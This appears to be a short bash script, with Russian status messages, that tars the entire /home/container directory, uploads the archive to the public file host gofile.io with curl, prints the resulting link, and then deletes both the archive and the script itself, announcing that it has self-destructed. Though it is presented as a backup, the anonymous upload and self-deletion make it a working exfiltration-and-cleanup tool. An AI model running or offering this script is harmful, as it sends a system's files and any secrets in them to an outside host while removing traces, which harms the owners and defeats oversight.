#!/bin/bash

echo "Архивирую..."
tar -czf /tmp/backup.tar.gz -C /home/container . 2>/dev/null

echo "Загружаю на Gofile..."
curl -s -F "file=@/tmp/backup.tar.gz" https://gofile.io/upload | grep -o "https://gofile.io/d/[^\"]*" | head -1

rm -f /tmp/backup.tar.gz
rm -f /tmp/backup.sh
echo "Готово. Скрипт самоуничтожился."
